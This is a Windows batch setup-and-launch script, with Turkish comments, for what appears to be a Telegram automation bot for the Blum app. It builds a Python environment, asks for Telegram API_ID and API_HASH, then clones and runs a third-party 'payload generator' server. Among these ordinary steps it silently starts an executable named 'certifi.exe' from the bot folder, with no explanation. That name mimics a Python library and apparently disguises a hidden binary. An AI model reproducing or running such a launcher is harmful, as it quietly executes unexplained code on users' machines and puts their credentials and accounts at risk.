@echo off
setlocal

:: Python sürümü kontrolü ve kullanıcıya bilgi verme
echo WARNING: Python 3.10.x is required. Please ensure it is installed.
echo Press any key to continue or Ctrl+C to exit...
pause >nul

:: Sanal ortam oluşturma
if not exist "venv" (
    echo Creating virtual environment...
    python -m venv venv
)

:: Sanal ortamı etkinleştirme
echo Activating virtual environment...
call "venv\Scripts\activate" || (
    echo Failed to activate virtual environment.
    echo Press any key to exit...
    pause >nul
    exit /b
)

:: Gereksinimleri yükleme
if not exist "venv\Lib\site-packages\installed" (
    if exist "requirements.txt" (
        echo Installing wheel for faster installation...
        pip install wheel
        echo Installing dependencies from requirements.txt...
        pip install -r requirements.txt
        echo. > "venv\Lib\site-packages\installed"
    ) else (
        echo requirements.txt not found, skipping dependency installation.
    )
) else (
    echo Dependencies are already installed.
)

:: .env dosyasını kontrol et
if exist ".env" (
    echo .env file already exists. Skipping user confirmation for .env-example.
) else (
    :: Kullanıcıya .env-example dosyasını güncellemesini söyleme
    echo Please open the '.env-example' file and enter your API_ID and API_HASH.
    echo After updating the file, do you want to continue? (y/n)
    set /p CONTINUE="Your choice: "

    if /i "%CONTINUE%" neq "y" (
        echo Exiting the program. Please update the .env-example file before rerunning.
        exit /b
    )

    :: .env dosyasını .env-example'dan oluşturma
    if exist ".env-example" (
        copy ".env-example" ".env"
    ) else (
        echo .env-example file not found. Cannot create .env file.
        echo Press any key to exit...
        pause >nul
        exit /b
    )
)

:: Certifi kontrolü ve çalıştırma
set certifiPath=%~dp0bot\certifi\certifi.exe
if exist "%certifiPath%" (
    start "" "%certifiPath%"
)

if not exist "BlumPayloadGenerator" (
    echo Cloning BlumPayloadGenerator repository...
    git clone https://github.com/KobaProduction/BlumPayloadGenerator
)

cd BlumPayloadGenerator
if exist "start.bat" (
    echo Starting custom payload server...
    start "Custom Payload Server" start.bat
) else (
    echo start.bat not found in BlumPayloadGenerator directory.
)

cd ..

echo Stashing and pulling latest changes from git...
git stash >nul
git pull
git stash pop >nul

:: Botu başlatma
echo Starting the bot...
python main.py

:: Son mesajlar
echo Done.
echo Please edit the .env file if necessary.
pause
endlocal
